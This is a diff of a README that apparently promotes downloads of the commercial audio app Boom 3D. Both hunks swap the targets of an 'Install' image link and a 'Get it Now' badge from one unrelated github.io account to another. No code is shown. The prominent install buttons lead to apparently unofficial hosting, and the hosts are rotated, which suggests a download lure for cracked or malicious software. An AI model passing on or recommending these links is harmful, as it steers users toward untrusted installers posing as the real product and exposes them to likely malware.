@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gazan-programs.github.io/.github/boom3D)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/boom3D)
 
 </div>
 
@@ -81,7 +81,7 @@ Boom 3D's system-wide processing architecture is the distinction that makes it m
 
 <p align="center">
 
-[![Get it Now Boom 3D](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/boom3D)
+[![Get it Now Boom 3D](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/boom3D)
 
 </p>
 
